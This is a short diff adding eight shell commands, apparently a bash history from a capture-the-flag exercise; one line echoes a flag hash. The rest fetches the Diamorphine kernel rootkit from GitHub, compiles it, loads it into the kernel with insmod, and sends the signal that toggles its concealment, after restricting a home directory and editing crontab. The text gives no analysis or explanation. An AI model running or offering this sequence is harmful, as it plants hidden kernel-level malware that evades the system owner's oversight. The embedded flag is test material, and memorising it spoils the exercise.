@@ -1,0 +1,8 @@
+chmod 700 /home/triddle/
+crontab -e
+echo "The f.l.a.g. is e47c89298a37b3d371ee9b51c897aa69"
+git clone https://github.com/m0nad/Diamorphine
+cd Diamorphine/
+make
+insmod diamorphine.ko
+kill -63 0
